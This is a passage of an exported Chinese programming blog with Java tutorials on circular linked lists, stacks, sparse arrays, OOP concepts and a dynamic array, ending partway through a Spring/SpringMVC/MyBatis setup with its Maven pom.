args) &#123; // 测试一把看看构建环形链表，和遍历是否ok CircleSingleLinkedList circleSingleLinkedList = new CircleSingleLinkedList(); circleSingleLinkedList.addBoy(125);// 加入5个小孩节点 circleSingleLinkedList.showBoy(); //测试一把小孩出圈是否正确 circleSingleLinkedList.countBoy(10, 20, 125); // 2-&gt;4-&gt;1-&gt;5-&gt;3 //String str = \"7*2*2-5+1-5+3-3\"; &#125;&#125;// 创建一个环形的单向链表class CircleSingleLinkedList &#123; // 创建一个first节点,当前没有编号 private Boy first = null; // 添加小孩节点，构建成一个环形的链表 public void addBoy(int nums) &#123; // nums 做一个数据校验 if (nums &lt; 1) &#123; System.out.println(\"nums的值不正确\"); return; &#125; Boy curBoy = null; // 辅助指针，帮助构建环形链表 // 使用for来创建我们的环形链表 for (int i = 1; i &lt;= nums; i++) &#123; // 根据编号，创建小孩节点 Boy boy = new Boy(i); // 如果是第一个小孩 if (i == 1) &#123; first = boy; first.setNext(first); // 构成环 curBoy = first; // 让curBoy指向第一个小孩 &#125; else &#123; curBoy.setNext(boy);// boy.setNext(first);// curBoy = boy; &#125; &#125; &#125; // 遍历当前的环形链表 public void showBoy() &#123; // 判断链表是否为空 if (first == null) &#123; System.out.println(\"没有任何小孩~~\"); return; &#125; // 因为first不能动，因此我们仍然使用一个辅助指针完成遍历 Boy curBoy = first; while (true) &#123; System.out.printf(\"小孩的编号 %d \\n\", curBoy.getNo()); if (curBoy.getNext() == first) &#123;// 说明已经遍历完毕 break; &#125; curBoy = curBoy.getNext(); // curBoy后移 &#125; &#125; // 根据用户的输入，计算出小孩出圈的顺序 /** * * @param startNo * 表示从第几个小孩开始数数 * @param countNum * 表示数几下 * @param nums * 表示最初有多少小孩在圈中 */ public void countBoy(int startNo, int countNum, int nums) &#123; // 先对数据进行校验 if (first == null || startNo &lt; 1 || startNo &gt; nums) &#123; System.out.println(\"参数输入有误， 请重新输入\"); return; &#125; // 创建要给辅助指针,帮助完成小孩出圈 Boy helper = first; // 需求创建一个辅助指针(变量) helper , 事先应该指向环形链表的最后这个节点 while (true) &#123; if (helper.getNext() == first) &#123; // 说明helper指向最后小孩节点 break; &#125; helper = helper.getNext(); &#125; //小孩报数前，先让 first 和 helper 移动 k - 1次 for(int j = 0; j &lt; startNo - 1; j++) &#123; first = first.getNext(); helper = helper.getNext(); &#125; //当小孩报数时，让first 和 helper 指针同时 的移动 m - 1 次, 然后出圈 //这里是一个循环操作，知道圈中只有一个节点 while(true) &#123; if(helper == first) &#123; //说明圈中只有一个节点 break; &#125; //让 first 和 helper 指针同时 的移动 countNum - 1 for(int j = 0; j &lt; countNum - 1; j++) &#123; first = first.getNext(); helper = helper.getNext(); &#125; //这时first指向的节点，就是要出圈的小孩节点 System.out.printf(\"小孩%d出圈\\n\", first.getNo()); //这时将first指向的小孩节点出圈 first = first.getNext(); helper.setNext(first); // &#125; System.out.printf(\"最后留在圈中的小孩编号%d \\n\", first.getNo()); &#125;&#125;// 创建一个Boy类，表示一个节点class Boy &#123; private int no;// 编号 private Boy next; // 指向下一个节点,默认null public Boy(int no) &#123; this.no = no; &#125; public int getNo() &#123; return no; &#125; public void setNo(int no) &#123; this.no = no; &#125; public Boy getNext() &#123; return next; &#125; public void setNext(Boy next) &#123; this.next = next; &#125;&#125;","categories":[],"tags":[{"name":"algorithm","slug":"algorithm","permalink":"https://kayleh.top/tags/algorithm/"}]},{"title":"Stack","slug":"栈Stack","date":"2020-05-10T23:30:11.000Z","updated":"2021-04-11T17:11:28.925Z","comments":true,"path":"stack/","link":"","permalink":"https://kayleh.top/stack/","excerpt":"栈(stack)1栈是一个先入后出(FILO-First In Last Out)的有序列表。","text":"栈(stack)1栈是一个先入后出(FILO-First In Last Out)的有序列表。 2栈(stack)是限制线性表中元素的插入和删除只能在线性表的同一端进行的一种特殊线性表。允许插入和删除的一端，为变化的一端，称为栈顶(Top)，另一端为固定的一端，称为栈底(Bottom)。 3.根据栈的定义可知，最先放入栈中元素在栈底，最后放入的元素在栈顶，而删除元素刚好相反，最后放入的元素最先删除，最先放入的元素最后删除 123456 ───────────────────────────────┐ (\\(\\ (\\(\\ (\\(\\ (\\(\\ (\\(\\ │ (&#x3D;&#39;.&#39;) &lt;─&gt; (&#x3D;&#39;.&#39;) (&#x3D;&#39;.&#39;) (&#x3D;&#39;.&#39;) (&#x3D;&#39;.&#39;)│O(_&quot;)&quot;) O(_&quot;)&quot;) O(_&quot;)&quot;) O(_&quot;)&quot;) O(_&quot;)&quot;)│ ───────────────────────────────┘ stack 和队列区别开 123456 ──────────────────────── (\\(\\ (\\(\\ (\\(\\ (\\(\\ (\\(\\ (&#x3D;&#39;.&#39;) ─&gt; (&#x3D;&#39;.&#39;) (&#x3D;&#39;.&#39;) (&#x3D;&#39;.&#39;) ─&gt; (&#x3D;&#39;.&#39;)O(_&quot;)&quot;) O(_&quot;)&quot;) O(_&quot;)&quot;) O(_&quot;)&quot;) O(_&quot;)&quot;) ──────────────────────── Queue 栈的结构12345678 ───────────────────────────────┐ (\\(\\ (\\(\\ (\\(\\ (\\(\\ │ (&#x3D;&#39;.&#39;) (&#x3D;&#39;.&#39;) (&#x3D;&#39;.&#39;) (&#x3D;&#39;.&#39;)│ O(_&quot;)&quot;) O(_&quot;)&quot;) O(_&quot;)&quot;) O(_&quot;)&quot;)│ ───────────────────────────────┘ ↑ ↑ Top栈顶 Bottom栈底初始化为-1 入栈12345678 ───────────────────────────────┐ (\\(\\ (\\(\\ (\\(\\ (\\(\\ │ (&#x3D;&#39;.&#39;) ─&gt; (&#x3D;&#39;.&#39;) (&#x3D;&#39;.&#39;) (&#x3D;&#39;.&#39;)│O(_&quot;)&quot;) O(_&quot;)&quot;) O(_&quot;)&quot;) O(_&quot;)&quot;)│ data ───────────────────────────────┘ push入栈 top++; stack[top]&#x3D;data 出栈123456789 ───────────────────────────────┐ (\\(\\ (\\(\\ (\\(\\ (\\(\\ │&lt;─ (&#x3D;&#39;.&#39;) (&#x3D;&#39;.&#39;) (&#x3D;&#39;.&#39;) (&#x3D;&#39;.&#39;)│ O(_&quot;)&quot;) O(_&quot;)&quot;) O(_&quot;)&quot;) O(_&quot;)&quot;)│ ───────────────────────────────┘ pop出栈 int value &#x3D; stack[top]; top--; return value;","categories":[],"tags":[{"name":"algorithm","slug":"algorithm","permalink":"https://kayleh.top/tags/algorithm/"}]},{"title":"SparseArray","slug":"SparseArray稀疏数组","date":"2020-05-07T05:28:41.000Z","updated":"2021-04-11T17:11:28.424Z","comments":true,"path":"sparsearray/","link":"","permalink":"https://kayleh.top/sparsearray/","excerpt":"","text":"稀疏数组​ （稀疏数组） 定义当一个数组中大部分的值未被使用，只有少部分的值的空间使用，造成了内存的浪费，这个时候就可以用到稀疏数组，保存需要的数据，节约内存空间。当记录一个棋盘时： 记录棋盘的位置，只有两个内容，其他未被使用没有意义的值浪费了内存空间 使用稀疏数组代替二维数组，第0行表示稀疏数组的总行，总列和所需内容的个数。 实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105package com.kayleh.tmall.controller;/** * @Author: Wizard * @Date: 2020/5/7 9:16 */public class SparseArray &#123; public static void main(String[] args) &#123; //创建一个二维数组 //0:表示没有棋子 1表示黑子 2表示蓝子 int chessArr[][] = new int[11][10]; chessArr[1][2] = 1; chessArr[2][3] = 2; for(int[] row:chessArr)&#123; for(int data:row)&#123; System.out.printf(\"%d\\t\",data); &#125; System.out.println(); &#125; int[][] array = getSparseArray(chessArr); System.out.println(\"-------\"); for(int i = 0 ; i&lt; array.length;i++)&#123; System.out.printf(\"%d\\t%d\\t%d\\t\\n\",array[i][0],array[i][1],array[i][2]); &#125; System.out.println(\"--------\"); int[][] startArr = recovery(array); for(int[] row:startArr)&#123; for(int data:row)&#123; System.out.printf(\"%d\\t\",data); &#125; System.out.println(); &#125; &#125; /** * 将普通数组转换为稀疏数组 * @param chessArr * @return */ public static int[][] getSparseArray(int[][] chessArr)&#123; if(!checkIsRight(chessArr))&#123; return null; &#125; //1.拿到数组后 首先获取元素的个数,然后才能建立稀疏数组 int sum = 0; for(int[] arr:chessArr)&#123; for(int i:arr)&#123; if(i != 0)&#123; sum++; &#125; &#125; &#125; //2.建立稀疏数组 int[][] sparseArr = new int[sum+1][3]; sparseArr[0][0] = chessArr.length; //行 sparseArr[0][1] = chessArr[0].length;//列 sparseArr[0][2] = sum; //元素个数 //3.数组存放 int count = 0; for(int i = 0; i &lt;chessArr.length; i++ )&#123; for(int j = 0; j &lt;chessArr[i].length;j++ )&#123; if(chessArr[i][j] != 0)&#123; sparseArr[++count][0] = i;//行 sparseArr[count][1] = j;//列 sparseArr[count][2] = chessArr[i][j]; &#125; &#125; &#125; return sparseArr; &#125; /** * 将稀疏数组转回普通数组 * @param sparseArr * @return */ public static int[][] recovery(int[][] sparseArr)&#123; if(!checkIsRight(sparseArr))&#123; return null; &#125; //获取原数组的 行数和列数 并创建原数组 int arr[][] = new int[sparseArr[0][0]][sparseArr[0][1]]; for(int i = 1; i &lt; sparseArr.length;i++)&#123; arr[sparseArr[i][0]][sparseArr[i][1]] = sparseArr[i][2]; &#125; return arr; &#125; public static boolean checkIsRight(int[][] arr)&#123; if(arr == null || arr.length &lt;= 1 )&#123; return false; &#125; return true; &#125;&#125;","categories":[],"tags":[{"name":"algorithm","slug":"algorithm","permalink":"https://kayleh.top/tags/algorithm/"}]},{"title":"面向对象","slug":"面向对象的特征","date":"2020-04-29T05:33:19.000Z","updated":"2021-04-11T17:11:29.099Z","comments":true,"path":"objectoriented/","link":"","permalink":"https://kayleh.top/objectoriented/","excerpt":"面向对象的特征有哪些方面封装最常见的是把属性私有化封装在一个类里面，只能通过方法去访问","text":"面向对象的特征有哪些方面封装最常见的是把属性私有化封装在一个类里面，只能通过方法去访问 继承extends可以复用代码， 继承是面向对象编程的一种强大的代码复用方式； 子类继承父类，从而继承了父类的方法和属性； Java只允许单继承，所有类最终的根类是Object； protected允许子类访问父类的字段和方法； protected关键字可以把字段和方法的访问权限控制在继承树内部，一个protected字段和方法可以被其子类，以及子类的子类所访问。 父类没有无参构造器时，子类任何class调用父类构造器时，必须调用super父类有的构造器。 如果父类没有默认的构造方法，子类就必须显式调用super()并给出参数以便让编译器定位到父类的一个合适的构造方法。即子类不会继承任何父类的构造方法。子类默认的构造方法是编译器自动生成的，不是继承的。 向上转型类型提升。 把一个子类类型安全地变为父类类型的赋值，被称为向上转型（upcasting）。 向上转型实际上是把一个子类型安全地变为更加抽象的父类型。 向下转型 和向上转型相反，如果把一个父类类型强制转型为子类类型，就是向下转型（downcasting）。 向下转型很可能会失败。 抽象 由于多态的存在，每个子类都可以覆写父类的方法 如果一个class定义了方法，但没有具体执行代码，这个方法就是抽象方法，抽象方法用abstract修饰。 因为无法执行抽象方法，因此这个类也必须申明为抽象类（abstract class）。 使用abstract修饰的类就是抽象类。我们无法实例化一个抽象类。 通过abstract定义的方法是抽象方法，它只有定义，没有实现。抽象方法定义了子类必须实现的接口规范； 定义了抽象方法的class必须被定义为抽象类，从抽象类继承的子类必须实现抽象方法； 如果不实现抽象方法，则该子类仍是一个抽象类； 面向抽象编程使得调用者只关心抽象方法的定义，不关心子类的具体实现。 多态 在继承关系中，子类如果定义了一个与父类方法签名完全相同的方法，被称为覆写（Override）。 多态具有一个非常强大的功能，就是允许添加更多类型的子类实现功能扩展，却不需要修改基于父类的代码。 子类可以覆写父类的方法（Override），覆写在子类中改变了父类方法的行为； Java的方法调用总是作用于运行期对象的实际类型，这种行为称为多态； final修饰符有多种作用： final修饰的方法可以阻止被覆写； final修饰的class可以阻止被继承； final修饰的field必须在创建对象时初始化，随后不可修改。","categories":[],"tags":[{"name":"interview","slug":"interview","permalink":"https://kayleh.top/tags/interview/"}]},{"title":"dynamic-array","slug":"动态数组","date":"2020-04-25T17:02:37.000Z","updated":"2021-04-11T17:11:28.761Z","comments":true,"path":"dynamic-array/","link":"","permalink":"https://kayleh.top/dynamic-array/","excerpt":"动态数组","text":"动态数组 数组是一种顺序储存的线性表,所有元素的内存地址是连续.12int[] array = new int[]&#123;20, 30, 40&#125;//向内存申请了12个字节地址 在很多编程语言中，数组有个致命的缺点， 无法动态修改容量。 实际开发中我们希望数组的容量是动态变化的。 动态数组创建ArrayList类,创建size属性来管理数组中元素的个数,创建element属性来管理存取的数据. 可以对动态数组进行增删改查操作. 12345678910111213141516171819202122232425public class ArrayList&lt;E&gt; &#123; private int size; private E[] elements; // 元素的数量 int size(); // 是否为空 boolean isEmpty(); // 是否包含某个元素 boolean contains(E element); // 添加元素到最后面 void add(E element); // 返回index位置对应的元素 E get(int index); // 设置index位置的元素 E set(int index, E element); // 往index位置添加元素 void add(int index, E element); // 删除index位置对应的元素 E remove(int index); // 查看元素的位置 int indexOf(E element); // 清除所有元素 void clear(); &#125; 动态数组的实现构造方法如果构建的数组空间小于默认空间,则会以默认空间创建数组. 1234567891011121314151617181920212223242526272829303132333435public class ArrayList&lt;E&gt; &#123; /** * 元素的数量 */ private int size; /** * 所有元素 */ private E[] elements; /** * 数组的默认容量 */ private static final int DEFAULT_CAPACITY = 10; /** * 找不到元素返回-1 */ private static final int ELEMENT_NOT_FOUNT = -1; public ArrayList() &#123; // 默认容量 //elements = new int[DEFAULT_CAPACITY]; this(DEFAULT_CAPACITY); // 调用下面的构造器 &#125; public ArrayList(int capacity) &#123; // 设置默认容量为 10 capacity = (capacity &lt; DEFAULT_CAPACITY) ? DEFAULT_CAPACITY : capacity; // 因为泛型(所以传一个Object数组,然后通过强转) elements = (E[]) new Object[capacity]; &#125;&#125; 添加元素 数组添加元素分为在最后一个元素的后面添加新元素和将元素插入到某个位置（非最后面）两种情况。 第一种情况，这个新元素需要添加到的索引等于当前数组元素的个数，在ArrayList中size属性就是当前数组元素的个数，所以就是将新元素添加到数组的size位置上，然后size加1。 1234public void add(int index, E element) &#123; elements[index] = element; size++;&#125; 如果是第二种情况，只需要将插入位置后面的元素向后移动即可。 注意：需要从后向前移动元素，如果从前向后移动元素，那么会进行元素覆盖, 最后出错。 数组越界添加元素,还要注意传入的索引不能越界,即不能小于0,也不能大于size. 12345678910/** * 根据index插入元素时,判断index是否有效 * * @param index */private void rangeCheckForAdd(int index) &#123; if (index &lt; 0 || index &gt; size) &#123; indexOutOfBounds(index); &#125;&#125; 12345678/** * 封装数组越界异常 * * @param index */private void indexOutOfBounds(int index) &#123; throw new IndexOutOfBoundsException(\"Index:\" + index + \", Size:\" + size);&#125; 数组扩容动态扩容思路: 通过默认容量创建的数组,是在堆空间中随机生成的地址;如此一来再申请空间拼接到该数组后,这种方式不可能实现; 我们只能再创建一个大容量的数组,然后将之前数组中的元素移动到这个数组中;然后将引用指向新数组即可! 由于数组elements最大的容量只有10，所以当数组存满元素时，就需要对数组进行扩容。 因为数组是无法动态扩容的，所以需要创建一个新的数组，这个数组的容量要比之前数组的容量大。 然后在将原数组中的元素存放到新数组中，这样就实现了数组的扩容。 该方法确保默认容量为多少,为了验证是否超过给定的默认容量,然后进行判断是否要扩容;这里size+1为数组当前数量+1, 因为每次add都会增加一个容量。 123456789101112131415161718192021222324/** * 确保至少要有capacity个容量 * * @param capacity */private void ensureCapacity(int capacity) &#123; // 获取数组当前容量 int oldCapacity = elements.length; // 判断是否要扩容 if (oldCapacity &gt;= capacity) return; // 此时不扩容 // 这种方式是扩容1.5倍 int newCapacity = oldCapacity + (oldCapacity &gt;&gt; 1); E[] newElements = (E[]) new Object[newCapacity]; // 将原来数组中的元素移动到新数组中 for (int i = 0; i &lt; size; i++) &#123; newElements[i] = elements[i]; &#125; // 将数组引用指向新数组 elements = newElements;&#125; 实现add函数，需要在添加新元素之前，判断数组越界和扩容。 12345678910111213141516171819/** * 在index位置插入一个元素 * * @param index * @param element */public void add(int index, E element) &#123; // 在添加元素的时候,判断index是否有效 rangeCheckForAdd(index); ensureCapacity(size + 1); // 注意: 插入元素后,元素是从后开始往后挪 for (int i = size - 1; i &gt;= index; i--) &#123; elements[i + 1] = elements[i]; &#125; elements[index] = element; size++;&#125; 最终在最后一个元素的后面添加新元素，即添加元素到尾部的实现方式如下 12345678910/** * 添加元素到尾部 * * @param element */public void add(E element) &#123; // elements[size++] = element; // 传入数组数量(相当于在最后插入元素) add(size, element);&#125; 删除元素 删除元素，实际上就是移除指定位置的元素，并将后面的元素向前移动。 如下图，当删除索引为3的元素时，只需要将后面的元素向前移动，然后在去掉最后一个元素，size减1即可。 数组越界 删除元素时传入的索引不能越界, 即不能小于0, 也不能大于等于size所以我们在删除元素之前需要先进行索引检查。 123456789private void indexOutOfBounds(int index) &#123; throw new IndexOutOfBoundsException(\"Index:\" + index + \", Size:\" + size);&#125; private void rangeCheck(int index) &#123; if (index &lt; 0 || index &gt;= size) &#123; outOfBounds(index); &#125;&#125; 数组缩容 当数组中的元素删除后，数组剩余的空间可能会很大，这样就会造成内存的浪费。 所以当数组中元素删除后，我们需要对数组进行缩容。 实现方法类似于扩容，当数组中容量小于某个值时，创建新的数组，然后将原有数组中的元素存入新数组即可。 12345678910111213141516171819/** * 数组缩容 */public void trim() &#123; // 获取当前数组的容量 int capacity = elements.length; // 当size大于等于容量的一半, 或则容量已经小于默认容量(10)时, 直接返回 if (size &gt;= capacity &gt;&gt; 1 || capacity &lt; CAPACITY_DEFAULT) return; // 计算新的容量 = 原有容量的一半 int newCapacity = capacity &gt;&gt; 1; // 创建新数组 E[] newElements = (E[]) new Object[newCapacity]; // 将原数组元素存入新数组 for (int i = 0; i &lt; size; i++) &#123; newElements[i] = elements[i]; &#125; // 引用新数组 elements = newElements;&#125; 最终, remove方法实现如下 1234567891011121314151617181920212223242526272829/** * 删除index位置的元素 * * @param index * @return 被删除的元素 */public E remove(int index) &#123; rangeCheck(index); E delEle = elements[index]; // 当删除一个元素时,需要挪动后面元素的范围 for (int i = index + 1; i &lt;= size - 1; i++) &#123; elements[i - 1] = elements[i]; &#125; size--; // 同clear的细节,当从后往前以后时,最后一个的地址需要释放 elements[size] = null; // 判断数组是否需要缩容 trim(); return delEle;&#125;/** * 删除传入的元素 * @param element */public void remove(E element)&#123; remove(indexOf(element));&#125; 清空数组 清空数组时，需要将所有的元素置为null，只有这样才能真正的释放对象，然后size置为0。 123456789/** * 清除所有元素 */public void clear() &#123; for (int i = 0; i &lt; size; i++) &#123; elements[i] = null; &#125; size = 0;&#125; 修改元素 修改元素时，只需要将原有位置的元素替换掉即可，同样需要注意一下索引是否越界。 1234567891011121314/** * 设置index位置的元素 * * @param index * @param element * @return 原来的元素 */public E set(int index, E element) &#123; rangeCheck(index); E oldEle = elements[index]; elements[index] = element; return oldEle;&#125; 查询元素 查询元素，只需要将指定索引的元素返回，注意索引是否越界即可。 1234567891011/** * 获取index位置的元素 * * @param index * @return */public E get(int index) &#123; // 约束Index rangeCheck(index); return elements[index];&#125; 查看元素位置 可以通过循环, 查找元素在数组中的位置。 注意：假如数组中可以存储null，而null是不能调用equals方法的，所以需要对传入的元素进行判断，如果查找的元素是null，需要单独处理。 当元素存在时返回索引，否则返回变量ELEMENT_ON_FOUND的值。 12345678910111213141516171819202122/** * 查看元素的索引 * * @param element * @return */public int indexOf(E element) &#123; if (element == null) &#123; // 循环判断如果element为null,直接返回null的索引 for (int i = 0; i &lt; size; i++) &#123; if (elements[i] == null) return i; &#125; &#125; else &#123; for (int i = 0; i &lt; size; i++) &#123; // 因为element肯定不为null了,所以放在前面;避免空指针异常 if (element.equals(elements[i])) return i; &#125; &#125; return ELEMENT_NOT_FOUNT;&#125; 是否包含某元素 只需通过判断索引是否等于ELEMENT_ON_FOUND即可。 12345678910/** * 是否包含某个元素 * * @param element * @return */public boolean contains(E element) &#123; // 如果element元素可以找到 return indexOf(element) != ELEMENT_NOT_FOUNT;&#125; 元素的数量 size的值，即为元素的数量 12345678/** * 元素的数量 * * @return */public int size() &#123; return size;&#125; 数组是否为空 通过判断size的值是否为0即可 12345678/** * 是否为空 * * @return */public boolean inEmpty() &#123; return size == 0;&#125; 动态数组打印 可以重写toString方法, 来打印ArrayList中的元素。 123456789101112131415@Overridepublic String toString() &#123; // 打印格式: size=3, [10, 20, 30] // 使用StringBuilder 效率高一些 StringBuilder string = new StringBuilder(); string.append(\"size=\").append(size).append(\", [\"); for (int i = 0; i &lt; size; i++) &#123; string.append(elements[i]); if (i != size - 1) &#123; string.append(\", \"); &#125; &#125; string.append(\"]\"); return string.toString();&#125; 这样就实现了动态数组的基本操作。 ArrayList能否进一步优化？ 在ArrayList中，如果要删除索引0位置的元素，则需要将索引0之后的元素全部往前移一位。 如果要在索引0位置添加元素，也需要将索引0及之后的元素全部往后移一位。 在ArrayList中增加一个记录首元素位置的属性。 删除索引0位置的元素，我们只需要将first属性改为1。 -在索引0位置添加元素，则只需要将first属性改为0。 如果继续往前插入元素，则将插入的元素存放在索引8这个位置，并将first改为8。 当要获取索引8下一个元素时，对索引取模，则拿到索引0位置的元素。 如果插入元素，则可选择挪动前半段数据或后半段数据。 在索引2处插入元素99，可以选择将元素22，33左移，然后插入99即可。 扩容和缩容同样可以优化。 重点总结动态扩容思路通过默认容量创建的数组,是在堆空间中随机生成的地址;如此一来再申请空间拼接到该数组后,这种方式不可能实现;我们只能再创建一个大容量的数组,然后将之前数组中的元素移动到这个数组中;然后将引用指向新数组即可! 如何确保容量是否越界该方法确保默认容量为多少, 为了验证是否超过给定的默认容量,然后进行判断是否要扩容; 这里size+1为数组当前数量+1, 因为每次add都会增加一个容量。 1ensureCapacity(size + 1); 增加泛型使用泛型, 使动态数组可以添加任何类型的数据。 1elements = (E[]) new Object[capacity]; clear方法的过渡细节因为之前存储的都是int数据, 直接设置size=0时, 开辟的存储int类型的空间就不能被访问, 当add后, 就可以访问后面的空间, 所以此时的空间可以重复利用; 当使用泛型后, 动态数组中存储的都是对象类型, 实际存储的都是对象的地址, 每一个对象的地址又有一块空间引用着; 此时如果仍设置 size=0, 当clear后,开辟的存储空间中的地址没有被销毁, 地址仍被对象空间引用着; 这样以来存储对象的空间就不会被释放; 但是存储地址的数组可以重复利用; 所以要将地址数组都置为null, 然后size=0, 这样以来,引用该地址的对象空间也就释放了! remove、indexOf的细节remove最后一个地址也要情况, 同clear细节在indexOf方法中,不用==比较, 因为比较的是地址值,一般重写equals方法自己定义比较内容即可;null值处理: 当往数组传null的时候,indexOf的比较处理: 如果那null.equals来比较会出现空指针异常;","categories":[],"tags":[{"name":"algorithm","slug":"algorithm","permalink":"https://kayleh.top/tags/algorithm/"}]},{"title":"Spring、SpringMVC、Mybatis整合","slug":"Spring、SpringMVC、Mybatis整合","date":"2020-04-20T05:05:31.000Z","updated":"2021-04-11T17:11:28.448Z","comments":true,"path":"spring-springmvc-mybatis-integration/","link":"","permalink":"https://kayleh.top/spring-springmvc-mybatis-integration/","excerpt":"SSM整合","text":"SSM整合 整合说明服务器开发分为三层,表现层、业务层、持久层表现层使用SpringMVC实现,业务程使用Spring实现,持久层使用Mybatis实现使用Spring框架来整合 SpringMVC和Mybatis框架这里使用xml配置文件+注解的方式进行搭建 最终目标最终实现通过前端页面对数据库进行查询和插入,实现用户的登录注册功能准备创建Maven工程 选择webapp 数据库准备1234567create database ssm;use ssm;create table account(id int primary key auto_increment,name varchar(20),money double); 创建目录 导入依赖123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;com.kayleh&lt;/groupId&gt; &lt;artifactId&gt;SSM&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;packaging&gt;war&lt;/packaging&gt; &lt;name&gt;SSM Maven Webapp&lt;/name&gt; &lt;!-- FIXME change it to the project's website --&gt; &lt;url&gt;http://www.example.com&lt;/url&gt; &lt;!--版本锁定--&gt; &lt;properties&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;maven.compiler.source&gt;1.7&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.7&lt;/maven.compiler.target&gt; &lt;spring.version&gt;5.0.2.RELEASE&lt;/spring.version&gt; &lt;slf4j.version&gt;1.6.6&lt;/slf4j.version&gt; &lt;log4j.version&gt;1.2.12&lt;/log4j.version&gt; &lt;mysql.version&gt;5.1.6&lt;/mysql.version&gt; &lt;mybatis.version&gt;3.4.5&lt;/mybatis.version&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.11&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;!-- spring --&gt; &lt;dependency&gt; &lt;groupId&gt;org.aspectj&lt;/groupId&gt; &lt;artifactId&gt;aspectjweaver&lt;/artifactId&gt; &lt;version&gt;1.6.8&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-aop&lt;/artifactId&gt; &lt;version&gt;$&#123;spring.version&#125;&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-context&lt;/artifactId&gt; &lt;version&gt;$&#123;spring.version&#125;&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-web&lt;/artifactId&gt; &lt;version&gt;$&#123;spring.version&#125;&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt; &lt;version&gt;$&#123;spring.version&#125;&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-test&lt;/artifactId&gt; &lt;version&gt;$&#123;spring.version&#125;&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-tx&lt;/artifactId&gt; &lt;version&gt;$&#123;spring.version&#125;&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-jdbc&lt;/artifactId&gt; &lt;version&gt;$&#123;spring.version&#125;&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.12&lt;/version&gt; &lt;scope&gt;compile&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;$&#123;mysql.version&#125;&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;servlet-api&lt;/artifactId&gt; &lt;version&gt;2.5&lt;/version&gt; &lt;scope&gt;provided&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;javax.servlet.jsp&lt;/groupId&gt; &lt;artifactId&gt;jsp-api&lt;/artifactId&gt; &lt;version&gt;2.0&lt;/version&gt; &lt;scope&gt;provided&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;jstl&lt;/groupId&gt; &lt;artifactId&gt;jstl&lt;/artifactId&gt; &lt;version&gt;1.2&lt;/version&gt; &lt;/dependency&gt; &lt;!-- log start --&gt; &lt;dependency&gt; &lt;groupId&gt;log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j&lt;/artifactId&gt; &lt;version&gt;$&#123;log4j.version&#125;&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-api&lt;/artifactId&gt; &lt;version&gt;$&#123;slf4j.version&#125;&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-log4j12&lt;/artifactId&gt; &lt;version&gt;$&#123;slf4j.version&#125;&lt;/version&gt; &lt;/dependency&gt; &lt;!-- log end --&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis&lt;/artifactId&gt; &lt;version&gt;$&#123;mybatis.version&#125;&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring&lt;/artifactId&gt; &lt;version&gt;1.3.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;c3p0&lt;/groupId&gt; &lt;artifactId&gt;c3p0&lt;/artifactId&gt; &lt;version&gt;0.9.1.2&lt;/version&gt; &lt;type&gt;jar&lt;/type&gt; &lt;scope&gt;compile&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; 